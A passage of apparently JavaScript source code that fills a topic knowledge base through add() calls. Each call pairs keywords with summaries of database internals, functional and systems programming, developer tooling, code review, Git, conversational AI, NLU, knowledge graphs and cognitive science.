    'Database Internals — Storage Engines: B-tree (balanced tree, O(log n) lookups, page-based storage, node splitting/merging, used in PostgreSQL/MySQL InnoDB), LSM-tree (Log-Structured Merge-tree, write-optimized, memtable → SSTable flush, compaction strategies — size-tiered, leveled, FIFO, used in RocksDB/Cassandra/LevelDB), page-based storage (fixed-size pages 4-16KB, buffer pool/cache, dirty page tracking, page replacement — LRU/clock), log-structured storage (append-only, segment files, compaction and merging, hash index, used in Bitcask). Query Optimization: cost-based optimizer (CBO — statistics collection, cardinality estimation, histograms, selectivity, cost model for I/O and CPU), join algorithms (nested loop join, hash join, sort-merge join, index nested loop join — choosing based on table sizes and indexes), index selection (covering indexes, composite indexes, index-only scans, partial indexes, expression indexes), query plans (EXPLAIN/EXPLAIN ANALYZE, sequential scan vs index scan, bitmap scan, plan caching, adaptive query execution). Transaction Isolation: read uncommitted (dirty reads allowed), read committed (no dirty reads, non-repeatable reads possible), repeatable read (snapshot isolation, no phantom reads in some implementations), serializable (full isolation, SSI — Serializable Snapshot Isolation), MVCC (Multi-Version Concurrency Control — each transaction sees consistent snapshot, version chains, vacuum/garbage collection).', 1.0)

  add('database_internals', ['consensus algorithms raft paxos pbft leader election distributed agreement', 'write ahead logging wal checkpointing crash recovery aries algorithm', 'indexing strategies b+ tree hash bitmap gin gist partial covering indexes'],
    'Consensus Algorithms: Raft (understandable consensus — leader election, log replication, safety, membership changes, used in etcd/CockroachDB/TiKV), Paxos (Lamport, proposers/acceptors/learners, Multi-Paxos for log replication, complex but proven), PBFT (Practical Byzantine Fault Tolerance — tolerates malicious nodes, 3f+1 nodes for f faults, used in permissioned blockchains), leader election (heartbeat-based, term/epoch numbering, split-brain prevention, fencing tokens). WAL and Recovery: write-ahead logging (WAL — write log record before data page modification, sequential I/O for durability, WAL segment files), checkpointing (flush dirty pages to disk, advance recovery point, fuzzy checkpoints, checkpoint interval tuning), crash recovery (redo phase — replay WAL from last checkpoint, undo phase — rollback incomplete transactions), ARIES (Algorithm for Recovery and Isolation Exploiting Semantics — physiological logging, LSN tracking, three-pass recovery — analysis/redo/undo, steal/no-force buffer management). Indexing Strategies: B+ tree (leaf nodes linked for range scans, high fanout, clustered vs non-clustered), hash index (O(1) lookups, equality only, no range queries), bitmap index (efficient for low cardinality columns, bitmap AND/OR operations), GIN (Generalized Inverted Index — full-text search, arrays, JSONB), GiST (Generalized Search Tree — geometric data, range types, nearest-neighbor), partial indexes (index subset of rows with WHERE clause), covering indexes (INCLUDE columns, index-only scans).', 1.0)

  // ── Functional Programming Deep Dive ─────────────────────────────────────────
  add('functional_deep', ['monads functors maybe option either result io state reader writer monad', 'algebraic data types sum types product types pattern matching exhaustive checks adt', 'type classes traits haskell type class rust trait scala implicits ad hoc polymorphism'],
    'Functional Programming Deep Dive — Monads and Functors: Functor (mappable container, fmap/map, laws — identity, composition), Applicative (apply function in context, pure + apply/<*>), Monad (sequencing computations, bind/flatMap/>>= , laws — left identity, right identity, associativity). Common monads: Maybe/Option (handle absence without null, Some/None, safe chaining), Either/Result (typed error handling, Left=error Right=success, railway-oriented programming), IO monad (encapsulate side effects, lazy evaluation, referential transparency), State monad (thread state through computations without mutation), Reader monad (dependency injection, shared environment), Writer monad (accumulate logs/output alongside computation). Algebraic Data Types: sum types (tagged unions, discriminated unions, Haskell data, Rust enum, TypeScript discriminated unions), product types (records, tuples, structs), pattern matching (destructuring, guard clauses, nested patterns, wildcard), exhaustive checking (compiler-enforced completeness, non-exhaustive warnings). Type Classes and Traits: Haskell type classes (class declaration, instance declaration, default methods, deriving), Rust traits (trait bounds, impl blocks, dyn dispatch, associated types), Scala implicits/givens (implicit parameters, context bounds, type class derivation), ad-hoc polymorphism (overloading resolved at compile time, vs parametric polymorphism).', 1.0)

  add('functional_deep', ['immutable data structures persistent vectors hamts finger trees zippers', 'effect systems algebraic effects zio cats effect free monads io monad', 'category theory applied functors natural transformations kleisli yoneda lemma'],
    'Immutable Data Structures: persistent vectors (Clojure-style, 32-way branching trie, structural sharing, O(log32 n) access), HAMTs (Hash Array Mapped Trie — persistent hash maps, used in Clojure/Scala/Haskell, bitmap indexing, path copying), finger trees (efficient deque, concatenation, splitting, used for sequences/priority queues), zippers (navigate and update immutable trees, focus/context pair, move up/down/left/right, reconstruct on unfocus). Structural sharing: only modified paths are copied, rest shared with previous version, enables efficient immutable updates. Effect Systems: algebraic effects (structured side effects, effect handlers, resumable exceptions, Koka/Eff/OCaml 5), ZIO (Scala, typed effects — ZIO[R, E, A], environment/error/success types, fiber-based concurrency, ZLayer for dependency injection), Cats Effect (Scala, IO monad, Resource for safe acquisition/release, concurrent primitives — Ref, Deferred, Semaphore), free monads (separate program description from interpretation, interpreter pattern, DSL construction, Church encoding). Category Theory Applied: functors (structure-preserving maps between categories), natural transformations (maps between functors, polymorphic functions, ~> type), Kleisli arrows (compose functions returning monadic values, Kleisli category, >=>), Yoneda lemma (every functor can be represented by natural transformations, optimization technique — fmap fusion, codensity monad for free monad optimization).', 1.0)

  // ── Low-Level & Systems Programming ──────────────────────────────────────────
  add('systems_programming', ['memory management stack heap malloc free raii reference counting smart pointers', 'cpu architecture awareness cache lines branch prediction simd sse avx memory ordering', 'linkers loaders elf format dynamic linking symbol resolution plt got relocation'],
    'Low-Level & Systems Programming — Memory Management: stack (automatic allocation, LIFO, fast, fixed size, local variables and function frames), heap (dynamic allocation, malloc/free, new/delete, fragmentation — internal/external, memory pools, slab allocation), RAII (Resource Acquisition Is Initialization — C++/Rust, destructor-based cleanup, scope-bound resource management), reference counting (shared_ptr, Rc/Arc in Rust, weak references to break cycles, ARC in Swift/ObjC), smart pointers (unique_ptr — exclusive ownership, shared_ptr — shared ownership, weak_ptr — non-owning observer, Box/Rc/Arc in Rust). CPU Architecture Awareness: cache lines (typically 64 bytes, spatial locality, false sharing in multithreading, cache-friendly data layout — struct of arrays vs array of structs), branch prediction (speculative execution, branch predictor tables, likely/unlikely hints, branchless programming techniques), SIMD (Single Instruction Multiple Data — SSE, AVX, AVX-512, NEON for ARM, auto-vectorization, intrinsics, data parallelism), memory ordering (sequential consistency, acquire-release semantics, relaxed ordering, memory barriers/fences, happens-before relationship, C++ memory model). Linkers and Loaders: ELF format (Executable and Linkable Format — sections .text/.data/.bss/.rodata, program headers, symbol table), dynamic linking (shared libraries .so/.dll/.dylib, PLT — Procedure Linkage Table, GOT — Global Offset Table, lazy binding), symbol resolution (strong vs weak symbols, name mangling, visibility attributes, --whole-archive), relocation (position-independent code — PIC, ASLR, relocation entries).', 1.0)

  add('systems_programming', ['system calls os interface syscall conventions file descriptors mmap epoll kqueue io_uring', 'unsafe code ffi rust unsafe c interop jni ctypes wasm interop foreign function', 'binary protocols endianness serialization formats protocol buffers flatbuffers capn proto'],
    'System Calls and OS Interface: syscall conventions (x86-64 — syscall instruction, register-based arguments, return in rax, errno), file descriptors (integer handles, stdin=0/stdout=1/stderr=2, open/read/write/close, dup2 for redirection), mmap (memory-mapped files, anonymous mappings, shared vs private, page-aligned, lazy allocation, used for shared memory IPC), epoll/kqueue/io_uring (epoll — Linux edge/level-triggered I/O multiplexing, kqueue — BSD/macOS, io_uring — Linux async I/O with submission/completion queues, zero-copy, registered buffers). Unsafe Code and FFI: Rust unsafe (raw pointer dereference, calling unsafe functions, implementing unsafe traits, accessing mutable statics, unsafe blocks minimize surface area), C interop (extern "C", #[no_mangle], repr(C) for ABI compatibility, bindgen for auto-generated bindings), JNI (Java Native Interface — native methods, JNIEnv pointer, local/global references, critical sections), ctypes (Python C FFI — loading shared libraries, specifying argtypes/restype, structures, callbacks), WASM interop (WebAssembly imports/exports, linear memory, wasm-bindgen, WASI for system access). Binary Protocols: endianness (big-endian — network byte order, little-endian — x86 native, htons/ntohs conversion), Protocol Buffers (Google protobuf, .proto schema, varint encoding, field tags, backward/forward compatible), FlatBuffers (zero-copy deserialization, in-place access, no parsing/unpacking overhead), Cap\'n Proto (zero-copy, RPC system, time-travel RPC, promise pipelining).', 1.0)

  // ── Developer Productivity ───────────────────────────────────────────────────
  add('developer_productivity', ['ide editor mastery vs code extensions jetbrains plugins vim neovim config lsp', 'debugging techniques conditional breakpoints watchpoints remote debugging core dumps strace dtrace', 'profiling tools cpu profilers memory profilers flame graphs async profiling ebpf'],
    'Developer Productivity — IDE and Editor Mastery: VS Code (extensions ecosystem — ESLint, Prettier, GitLens, Remote SSH/Containers, Copilot, multi-cursor editing, integrated terminal, tasks.json, launch.json debugging), JetBrains (IntelliJ/WebStorm/PyCharm — refactoring tools, structural search and replace, database tools, live templates, postfix completion), Vim/Neovim (modal editing, text objects, macros, registers, Neovim — Lua config, Treesitter, native LSP, telescope.nvim, lazy.nvim plugin manager), LSP (Language Server Protocol — language-agnostic intelligence, hover/completion/diagnostics/code actions, implementations — rust-analyzer, tsserver, gopls, clangd). Debugging Techniques: conditional breakpoints (break only when expression is true, hit count conditions, log points without stopping), watchpoints (data breakpoints — break when memory/variable changes, hardware-assisted), remote debugging (attach to remote process, SSH tunneling, Chrome DevTools Protocol, DAP — Debug Adapter Protocol), core dumps (post-mortem debugging, ulimit -c unlimited, gdb/lldb analysis, crash dump analysis on Windows), strace/dtrace (strace — Linux syscall tracing, ltrace — library call tracing, dtrace — DTrace dynamic tracing on macOS/Solaris/FreeBSD, SystemTap on Linux). Profiling Tools: CPU profilers (sampling profilers — perf, async-profiler, py-spy, statistical accuracy vs overhead), memory profilers (heap profiling, allocation tracking, Valgrind/Massif, Chrome DevTools heap snapshots, Go pprof), flame graphs (Brendan Gregg, stack trace visualization, hot path identification, differential flame graphs, speedscope), async profiling (wall-clock profiling for I/O-bound code, async-profiler Java, py-spy --idle flag), eBPF (extended Berkeley Packet Filter — kernel-level tracing, bpftrace, BCC tools, low overhead production profiling).', 1.0)

  add('developer_productivity', ['code navigation code intelligence symbol search call hierarchies type definitions', 'cli tools developers ripgrep fd jq fzf tmux zoxide bat command line', 'development environments devcontainers nix dotfiles management codespaces'],
    'Code Navigation: code intelligence (go-to-definition, find references, peek definition, rename symbol across project), symbol search (workspace symbol search, fuzzy matching, file-level outline, breadcrumbs), call hierarchies (incoming calls — who calls this function, outgoing calls — what does this function call, type hierarchy — inheritance tree), type definitions (go-to-type-definition, hover type info, inlay hints for inferred types, parameter info). CLI Tools for Developers: ripgrep (rg — fast recursive grep, respects .gitignore, PCRE2 regex, file type filters), fd (fast find alternative, regex/glob patterns, colorized output, exec), jq (JSON processor — select, filter, transform, raw output, slurp mode), fzf (fuzzy finder — interactive selection, preview window, key bindings for shell history/file selection, integration with other tools), tmux (terminal multiplexer — sessions, windows, panes, detach/attach, tmux-resurrect for persistence, tmux-continuum), zoxide (smarter cd — frecency algorithm, z command, interactive selection with zi), bat (cat with syntax highlighting, line numbers, Git integration, pager). Development Environments: devcontainers (Docker-based development, devcontainer.json spec, features, VS Code/Codespaces/JetBrains support, reproducible environments), Nix (reproducible builds, nix-shell, nix develop, flakes for hermetic builds, nixpkgs package collection), dotfiles management (chezmoi, GNU Stow, bare Git repo, cross-machine sync, templating for machine-specific config), codespaces (GitHub Codespaces, cloud development environments, prebuilds, port forwarding, dotfiles integration).', 1.0)

  // ── Code Review Best Practices ───────────────────────────────────────────────
  add('code_review', ['review checklist correctness readability performance security tests documentation', 'review techniques line by line architecture review security review nitpick blocking', 'giving feedback constructive criticism praise asking questions suggesting alternatives'],
    'Code Review Best Practices — Review Checklist: correctness (does the code do what it claims, edge cases handled, off-by-one errors, null/undefined handling), readability (clear naming, consistent style, appropriate abstractions, cognitive complexity), performance (algorithmic complexity, unnecessary allocations, N+1 queries, caching opportunities), security (input validation, SQL injection, XSS, authentication/authorization checks, secrets in code), tests (adequate coverage, meaningful assertions, edge cases tested, no flaky tests), documentation (public API documented, complex logic explained, README updated, changelog entry). Review Techniques: line-by-line review (thorough examination, comment on specific lines, suggest inline changes), architecture review (high-level design assessment, component boundaries, dependency direction, coupling analysis), security review (OWASP checklist, dependency vulnerabilities, sensitive data handling, access control verification), nitpick vs blocking (nitpick — style/preference suggestions marked as non-blocking, blocking — must-fix issues like bugs/security/correctness, clearly label severity). Giving Feedback: constructive criticism (focus on code not person, explain why not just what, offer alternatives), praise (acknowledge good patterns, highlight clever solutions, recognize improvements), asking questions (Socratic method — "what happens if...", "have you considered...", genuine curiosity vs disguised criticism), suggesting alternatives (show code examples, link to documentation, explain trade-offs between approaches).', 1.0)

  add('code_review', ['common review issues magic numbers poor naming missing error handling race conditions', 'automated review tools linters static analysis sonarqube codeclimate codacy', 'pr strategies small prs stacked prs draft prs review rounds merge strategies'],
    'Common Review Issues: magic numbers (replace with named constants, enum values, configuration), poor naming (ambiguous variables, misleading function names, inconsistent terminology, abbreviations), missing error handling (uncaught exceptions, ignored promise rejections, missing null checks, error swallowing), race conditions (shared mutable state, missing synchronization, TOCTOU — time of check to time of use, concurrent map access), code duplication (DRY violations, extract shared utilities, wrong abstraction worse than duplication), dead code (unreachable branches, unused imports, commented-out code, feature flags not cleaned up). Automated Review Tools: linters (ESLint, Pylint, RuboCop, golangci-lint — style enforcement, bug detection, auto-fix), static analysis (SonarQube — code smells, bugs, vulnerabilities, technical debt, quality gates, CodeClimate — maintainability, test coverage, duplication, Codacy — automated code review, security patterns, coding standards, Semgrep — pattern-based analysis, custom rules, security focus). PR Strategies: small PRs (easier to review, faster feedback, lower risk, aim for <400 lines changed), stacked PRs (dependent PRs in sequence, graphite/ghstack tools, incremental review, rebase chain management), draft PRs (work-in-progress, early feedback, RFC-style discussion, not ready for merge), review rounds (address all comments, re-request review, avoid force-push during review, conversation resolution), merge strategies (merge commit — full history, squash — clean main branch, rebase — linear history, merge queue for CI).', 1.0)

  // ── Clean Code Principles ────────────────────────────────────────────────────
  add('clean_code', ['naming conventions meaningful names avoid abbreviations domain language consistent vocabulary', 'function design single responsibility small functions pure functions minimal parameters', 'error handling patterns fail fast error types hierarchy result pattern sentinel values exceptions'],
    'Clean Code Principles — Naming Conventions: meaningful names (intention-revealing, pronounceable, searchable — getUserById not gUBI, isActive not flag), avoid abbreviations (customerAddress not custAddr, except well-known — URL, HTTP, ID), domain language (ubiquitous language from DDD, business terms in code, shared vocabulary between developers and domain experts), consistent vocabulary (one word per concept — fetch/retrieve/get pick one, avoid synonyms for same operation, project glossary). Function Design: single responsibility (each function does one thing well, extract till you drop, functions should be 5-20 lines ideally), small functions (easy to name, easy to test, easy to understand, one level of abstraction per function), pure functions (same inputs always produce same outputs, no side effects, easier to test and reason about, enables memoization), minimal parameters (ideally 0-2 parameters, 3+ consider parameter object, avoid boolean flag parameters — split into two functions, avoid output parameters). Error Handling Patterns: fail fast (validate inputs early, throw on invalid state, preconditions/assertions, guard clauses at function start), error types hierarchy (custom error classes extending base Error, domain-specific errors — NotFoundError, ValidationError, AuthorizationError), Result pattern (Rust Result<T,E>, TypeScript neverthrow, Go error return values, explicit error handling without exceptions, railway-oriented programming), sentinel values vs exceptions (sentinel values — null, -1, empty string — avoid, prefer Optional/Maybe types, exceptions for exceptional conditions only, checked vs unchecked exceptions debate).', 1.0)

  add('clean_code', ['code organization cohesion coupling package by feature layered architecture screaming', 'comments documentation self documenting code when to comment jsdoc tsdoc readme driven', 'testing pyramid unit integration e2e contract acceptance testing trophy'],
    'Code Organization: cohesion (related code together, high cohesion within modules, single responsibility at module level, functional cohesion — elements contribute to single task), coupling (minimize dependencies between modules, loose coupling, dependency inversion, avoid circular dependencies, afferent/efferent coupling metrics), package-by-feature (organize by business capability not technical layer, each feature is self-contained, easier navigation, better encapsulation), layered architecture (presentation → business → data access, dependency rule — inner layers don\'t know outer, clean architecture onion model), screaming architecture (project structure screams its purpose, top-level folders reflect domain not framework — /orders /users /products not /controllers /services /repositories). Comments and Documentation: self-documenting code (meaningful names eliminate need for comments, code should explain what and how, comments explain why), when to comment (legal/license headers, TODO/FIXME with ticket numbers, public API documentation, complex algorithms, workarounds for known issues, regex explanations), JSDoc/TSDoc (type documentation with @param @returns @throws @example, generates API reference, IDE hover information, TypeDoc/JSDoc3 generators), README-driven development (write README before code, define API before implementation, usage examples first, developer experience focus). Testing Pyramid: unit tests (fast, isolated, many — test individual functions/classes, mock dependencies), integration tests (test component interactions, database/API integration, fewer than unit tests), e2e tests (end-to-end user flows, Cypress/Playwright/Selenium, slowest, fewest), contract tests (API contract verification, consumer-driven, Pact), acceptance tests (business requirement verification, BDD — Given/When/Then, Cucumber), testing trophy (Kent C. Dodds — emphasizes integration tests over unit tests, static analysis at base, fewer e2e at top).', 1.0)

  // ── Version Control Advanced ─────────────────────────────────────────────────
  add('version_control', ['git internals objects refs packfiles reflog dag structure blob tree commit tag', 'branching strategies git flow github flow trunk based development release branches', 'rebase vs merge interactive rebase squash fixup autosquash rebase onto'],
    'Version Control Advanced — Git Internals: objects (blob — file content, tree — directory listing, commit — snapshot + metadata + parent(s), tag — annotated reference, all content-addressed by SHA-1/SHA-256 hash), refs (branches are movable pointers to commits, HEAD — current branch pointer, tags — fixed pointers, remote tracking branches — origin/main), packfiles (loose objects packed for efficiency, delta compression, pack index for fast lookup, gc and repack commands), reflog (reference log — records all ref changes locally, safety net for recovery, git reflog expire, 90 days default retention), DAG structure (Directed Acyclic Graph — commits form a DAG, merge commits have multiple parents, enables efficient traversal and common ancestor finding). Branching Strategies: Git Flow (main + develop branches, feature/release/hotfix branches, structured release process, heavier process suited for versioned releases), GitHub Flow (main branch + feature branches, pull requests for all changes, deploy from main, simpler and continuous delivery friendly), trunk-based development (everyone commits to main/trunk, short-lived feature branches if any, feature flags for incomplete features, CI/CD oriented, reduces merge conflicts), release branches (branch at release candidate, cherry-pick fixes, parallel maintenance, version tagging). Rebase vs Merge: interactive rebase (git rebase -i, reorder/edit/squash/drop commits, clean up before merging, rewrite commit messages), squash (combine multiple commits into one, clean merge history, squash and merge in PRs), fixup (like squash but discards commit message, git commit --fixup=<SHA>, autosquash arranges automatically), rebase onto (git rebase --onto, transplant branch to new base, useful for rebasing off wrong branch).', 1.0)

  add('version_control', ['git hooks automation pre-commit commit-msg pre-push husky lint-staged', 'monorepo management nx turborepo lerna workspace protocols affected commands', 'conflict resolution merge strategies ours theirs rerere octopus merge three way'],
    'Git Hooks and Automation: pre-commit (run linters, formatters, type checks before commit, reject if failing, lint-staged for staged files only), commit-msg (validate commit message format, conventional commits enforcement, ticket number requirement), pre-push (run test suite before push, prevent pushing to protected branches, check for secrets/credentials), husky (Git hooks manager for Node.js projects, .husky/ directory, simple configuration, supports all Git hooks), lint-staged (run commands on staged files only, glob pattern matching, concurrent execution, auto-add fixed files). Monorepo Management: Nx (smart build system, computation caching, affected command — only build/test changed projects, dependency graph visualization, generators and executors, distributed task execution with Nx Cloud), Turborepo (high-performance build system, remote caching, pipeline configuration, parallel execution, pruned subsets for deployment), Lerna (original JS monorepo tool, versioning and publishing, independent or fixed versioning, changelog generation), workspace protocols (npm/yarn/pnpm workspaces, workspace: protocol for local references, hoisting, node_modules resolution). Conflict Resolution: merge strategies (recursive — default, resolve — simple two-head, ours — keep current branch entirely, subtree — tree matching), ours/theirs (git checkout --ours/--theirs for specific files, merge strategy vs strategy option, -X ours/theirs for auto-resolution preference), rerere (reuse recorded resolution — remember conflict resolutions, apply automatically on similar conflicts, git rerere gc, useful for long-running branches), octopus merge (merge multiple branches simultaneously, default for >2 heads, fails on conflicts, used for topic branch integration), three-way merge (common ancestor + two branch tips, automatic merging of non-conflicting changes, diff3 format shows base version for clearer conflict resolution).', 1.0)

  // ── Conversational AI & Dialogue Systems ──────────────────────────────────────
  add('conversational_ai', ['conversational ai chatbot dialogue system virtual assistant', 'dialogue management state tracking slot filling task oriented', 'open domain chitchat social bot empathetic dialogue'],
    'Conversational AI: Dialogue systems — task-oriented (goal-driven: booking, FAQ, customer service) vs open-domain (chitchat, social bots). Architecture: NLU → Dialogue Manager → NLG. Dialogue state tracking (DST): track user goals, slots (entities needed), belief state across turns. Slot filling: identify required entities for task completion. Frame-based: predefined slots per intent (e.g., book_flight: origin, destination, date). Finite-state: fixed conversation flows. Statistical: POMDP, neural belief tracking (TRADE, SimpleTOD, SOLOIST). Open-domain: retrieval-based (select from corpus), generative (seq2seq, GPT), hybrid. Challenges: context tracking, coreference resolution, topic switching, grounding, coherence. Evaluation: task success rate, dialogue turns, user satisfaction, BLEU/METEOR for generation quality.', 1.1)

  add('conversational_ai', ['intent recognition classification nlu natural language understanding', 'entity extraction named entity recognition ner slot', 'dialogue policy reinforcement learning conversation strategy'],
    'Conversational AI components: Intent recognition — classify user utterance into predefined intents (greeting, booking, complaint, FAQ). Methods: rule-based (keyword matching, regex), ML (SVM, random forest on TF-IDF), deep learning (BERT, RoBERTa fine-tuning, few-shot with GPT). Multi-intent: detect multiple intents in one utterance. Entity extraction: Named Entity Recognition (NER) for slot values — dates, locations, names, amounts. CRF, BiLSTM-CRF, BERT-NER, SpaCy. Dialogue policy: decide next action given dialogue state. Rule-based: handcrafted decision trees. RL-based: DQN, policy gradient, reward shaping. Imitation learning from human demonstrations. Response selection vs generation. Fallback strategies: escalation to human, clarification questions, graceful failure. Persona consistency: maintain character traits across conversation. Frameworks: Rasa, Dialogflow, Amazon Lex, Microsoft Bot Framework, LangChain.', 1.1)

  add('conversational_ai', ['conversation context window memory attention history', 'multi turn dialogue management conversation flow topic tracking', 'response generation template retrieval generative grounded'],
    'Conversation management: Context window — maintain relevant conversation history. Sliding window (last N turns), summarization-based (compress old context), attention-based (attend to relevant past turns). Memory architectures: short-term (working memory for current conversation), long-term (user preferences, past interactions, learned facts), episodic (specific interaction memories). Multi-turn dialogue: tracking topic shifts, maintaining coherence across turns, handling interruptions, returning to previous topics. Anaphora resolution: resolving "it", "that", "they" to referents in conversation. Response generation strategies: template-based (reliable, limited), retrieval-based (select best match from corpus), generative (create novel responses), grounded (augmented with knowledge base/documents). Knowledge-grounded dialogue: condition responses on retrieved facts (KGPT, DIALKI). RAG (Retrieval-Augmented Generation): retrieve relevant documents then generate response. Evaluation: perplexity, BLEU, human evaluation (fluency, relevance, informativeness, engagement). Safety: content filtering, toxic language detection, bias mitigation.', 1.1)

  // ── Natural Language Understanding (NLU) ────────────────────────────────────
  add('nlu', ['natural language understanding nlu semantic parsing meaning', 'word embedding word2vec glove fasttext contextual embedding', 'semantic role labeling srl argument structure predicate'],
    'Natural Language Understanding: NLU pipeline — tokenization → POS tagging → parsing → NER → SRL → semantic parsing. Goal: extract structured meaning from unstructured text. Word embeddings: Word2Vec (CBOW, Skip-gram), GloVe (global co-occurrence), FastText (subword), contextual (ELMo, BERT, GPT). Sentence embeddings: Sentence-BERT, USE (Universal Sentence Encoder). Semantic Role Labeling (SRL): identify who did what to whom, when, where, why (Agent, Patient, Instrument, Location, Time). PropBank, FrameNet resources. Semantic parsing: map natural language to formal representation (SQL, lambda calculus, AMR — Abstract Meaning Representation). Text-to-SQL: WikiSQL, Spider benchmarks. Compositional semantics: meaning of whole derived from parts. Distributional semantics: meaning from context (you shall know a word by the company it keeps). Pragmatics: context-dependent meaning beyond literal semantics.', 1.1)

  add('nlu', ['text classification sentiment analysis topic modeling document', 'relation extraction knowledge extraction information extraction', 'question answering reading comprehension machine comprehension'],
    'NLU tasks: Text classification — sentiment (positive/negative/neutral), topic, spam, toxicity detection. Models: Naive Bayes, SVM, CNN, LSTM, BERT fine-tuning. Transfer learning: pretrain on large corpus, fine-tune on task. Relation extraction: identify relationships between entities in text (born_in, works_for, located_in). Distant supervision, few-shot, zero-shot approaches. Knowledge extraction: extract structured knowledge from unstructured text — entities, relations, events, temporal information. Open Information Extraction (OpenIE): extract (subject, predicate, object) triples. Question answering: extractive (find answer span in passage — SQuAD, BERT-QA), abstractive (generate answer — T5, GPT), open-domain (retrieve documents then answer — DPR, RAG, FiD). Machine reading comprehension: test understanding of passages. Multi-hop reasoning: combine information from multiple passages. Knowledge-intensive QA: requires external knowledge beyond the passage.', 1.1)

  add('nlu', ['coreference resolution anaphora pronoun reference linking', 'discourse parsing rhetorical structure theory coherence', 'pragmatics implicature presupposition speech act context'],
    'Advanced NLU: Coreference resolution — link mentions that refer to same entity ("John went to the store. He bought milk." → He = John). Mention detection, entity clustering, neural coref (e2e-coref, CorefQA). Discourse parsing: analyze text structure beyond sentences. Rhetorical Structure Theory (RST): relations between text spans (elaboration, contrast, cause, condition). Discourse coherence: topic continuity, entity-based coherence, centering theory. Pragmatics: meaning beyond literal semantics. Implicature: implied meaning (Grice\'s maxims — quantity, quality, relation, manner). Presupposition: assumed background knowledge ("When did you stop?" presupposes you were doing it). Speech acts: locutionary (literal), illocutionary (intended — request, promise, threat), perlocutionary (effect). Context-dependent interpretation: deixis (this, here, now), ellipsis (omitted but understood), irony/sarcasm detection. Word sense disambiguation (WSD): determine correct meaning of polysemous words from context.', 1.1)

  // ── Knowledge Graphs & Representation ───────────────────────────────────────
  add('knowledge_graphs', ['knowledge graph ontology triple rdf owl sparql', 'knowledge representation reasoning semantic web linked data', 'knowledge base population construction extraction'],
    'Knowledge Graphs: Structure — nodes (entities) and edges (relationships) forming a directed graph. Triples: (subject, predicate, object) — e.g., (Einstein, born_in, Germany). RDF (Resource Description Framework): standard for knowledge representation. OWL (Web Ontology Language): formal ontology with classes, properties, axioms, reasoning. SPARQL: query language for RDF graphs. Major KGs: Wikidata (open, collaborative), DBpedia (from Wikipedia), Freebase (legacy, now Wikidata), Google Knowledge Graph (commercial), YAGO, ConceptNet (commonsense). Knowledge base population: entity linking (map mentions to KG entities), relation extraction, knowledge graph completion (predict missing links). Embedding methods: TransE, TransR, RotatE, ComplEx — embed entities and relations in vector space for link prediction. Applications: search engines, QA systems, recommendation, drug discovery, fraud detection.', 1.1)

  add('knowledge_graphs', ['ontology design class hierarchy property domain range axiom', 'reasoning inference rule forward chaining backward chaining', 'commonsense knowledge reasoning everyday understanding'],
    'Knowledge representation: Ontology design — classes (categories), instances (individuals), properties (relations, attributes), inheritance (subclass-of), axioms (constraints, rules). Upper ontologies: SUMO, BFO, DOLCE. Domain ontologies: Gene Ontology (biology), SNOMED CT (medicine), schema.org (web). Reasoning: deductive (given rules, derive conclusions), inductive (generalize from examples), abductive (best explanation for observations). Forward chaining: data-driven, apply rules to known facts to derive new facts. Backward chaining: goal-driven, start from query and work backward to find supporting facts. OWL reasoning: consistency checking, classification, realization. Commonsense knowledge: everyday understanding that humans take for granted. ConceptNet: commonsense knowledge graph (HasProperty, UsedFor, CapableOf, Causes). ATOMIC: commonsense about events (xIntent, xReact, xEffect). Scripts and frames: Schank\'s scripts (restaurant script), Minsky\'s frames. Commonsense reasoning challenges: Winograd Schema, PIQA, HellaSwag.', 1.1)

  add('knowledge_graphs', ['entity linking disambiguation named entity normalization', 'graph neural network gnn knowledge graph embedding', 'knowledge fusion integration alignment merging heterogeneous'],
    'Knowledge graph techniques: Entity linking — map text mentions to knowledge graph entities. Steps: mention detection, candidate generation (string matching, alias tables), entity disambiguation (context matching, neural ranking). Entity disambiguation: resolve ambiguity (e.g., "Apple" → company or fruit) using context. Cross-lingual entity linking: link mentions across languages to same entity. Graph Neural Networks (GNN) for KGs: R-GCN (Relational Graph Convolutional Network), CompGCN, KBAT. Node classification, link prediction, graph classification. KG embeddings: TransE (translation-based), DistMult (bilinear), ComplEx (complex-valued), RotatE (rotation). Scoring functions for triple plausibility. Knowledge fusion: integrate knowledge from multiple heterogeneous sources. Schema alignment: map ontologies across systems. Entity resolution: identify same entity across databases. Conflict resolution: handle contradictory information. Temporal knowledge graphs: time-stamped facts, temporal reasoning, event ordering.', 1.1)

  // ── Cognitive Science & Learning Theory ──────────────────────────────────────
  add('cognitive_science', ['cognitive science cognition perception attention memory learning', 'working memory short term long term episodic semantic procedural', 'cognitive load theory schema automation chunking dual channel'],
    'Cognitive Science: Study of mind and intelligence across disciplines (psychology, neuroscience, AI, linguistics, philosophy, anthropology). Core topics: perception (how we interpret sensory input), attention (selective focus, limited capacity, attentional bottleneck), memory (encoding → storage → retrieval), learning (behavioral, cognitive, social), language (comprehension, production, acquisition), reasoning (deductive, inductive, analogical), decision-making (heuristics, biases, bounded rationality). Memory systems: sensory memory (brief, iconic/echoic), working memory (Baddeley model: phonological loop, visuospatial sketchpad, central executive, episodic buffer — 7±2 items), long-term (explicit: episodic — personal events, semantic — facts/concepts; implicit: procedural — skills, priming). Cognitive load theory (Sweller): intrinsic (material complexity), extraneous (poor design), germane (schema construction). Reduce extraneous load, manage intrinsic, optimize germane. Chunking: group items into meaningful units to expand working memory capacity. Dual coding: verbal + visual channels for better learning.', 1.0)

  add('cognitive_science', ['mental model schema frame script knowledge structure', 'metacognition self regulation thinking about thinking', 'cognitive bias heuristic anchoring confirmation availability'],
    'Cognitive structures: Mental models — internal representations of external reality. Used for prediction, inference, and decision-making. Schema theory (Piaget): assimilation (fit new info into existing schema) vs accommodation (modify schema for new info). Frames (Minsky): structured knowledge representation with default values and slots. Scripts (Schank & Abelson): knowledge about typical event sequences (restaurant script: enter → seat → order → eat → pay → leave). Expertise: domain experts have richer, more interconnected schemas; pattern recognition replaces deliberate calculation. Metacognition: thinking about one\'s own thinking. Planning, monitoring, evaluating one\'s cognitive processes. Self-regulation: setting goals, monitoring progress, adjusting strategies. Calibration: accuracy of confidence in one\'s knowledge. Cognitive biases (Kahneman & Tversky): anchoring (initial value influences), confirmation bias (seek confirming evidence), availability heuristic (judge frequency by ease of recall), representativeness (judge probability by similarity), dunning-kruger (overconfidence in low competence), hindsight bias ("I knew it all along"). Dual process theory: System 1 (fast, automatic, intuitive) vs System 2 (slow, deliberate, analytical).', 1.0)

  add('cognitive_science', ['learning theory constructivism scaffolding zone proximal development', 'transfer learning analogy abstraction generalization', 'distributed cognition embodied situated extended mind'],
